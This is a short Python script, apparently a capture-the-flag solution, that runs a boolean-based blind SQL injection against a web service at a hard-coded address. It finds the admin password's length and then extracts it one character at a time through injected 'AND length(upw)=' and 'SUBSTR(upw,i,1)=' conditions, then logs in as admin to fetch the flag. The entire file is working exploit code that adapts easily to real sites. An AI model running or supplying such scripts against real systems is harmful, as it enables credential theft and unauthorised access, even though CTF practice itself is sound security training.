import requests
import string
#13
dic = string.ascii_letters + string.digits + "\{\}_"
url = "http://47.128.66.76:30039/"
param = "?uid="

#get length
len = 0
for i in range(100):
    print(f'Try: {i}', end="\n")
    payload = f"admin' AND length(upw)={i}-- -"
    response = requests.get(url+param+payload).text
    if "exists" in response:
        print(f'Length password is: {i}', end = "\n")
        len = i
        break
    
#get password
password=''
for i in range(1,len+1):
    for j in dic:
        print(f'Test "{j}"...', end="\n")
        payload = f"admin' AND SUBSTR(upw,{i},1)='{j}'-- -"
        response = requests.get(url+param+payload).text
        if "exists" in response:
            password+=j
            print(f'Password found...{i}: {password}', end="\n")
            break
print(f'Found password: {password}', end="\n")

#get flag
path = "login"
data = {
    "username":"admin",
    "password":password
}
response = requests.post(url+path, data=data).text
print(f'Flag: {response}')
    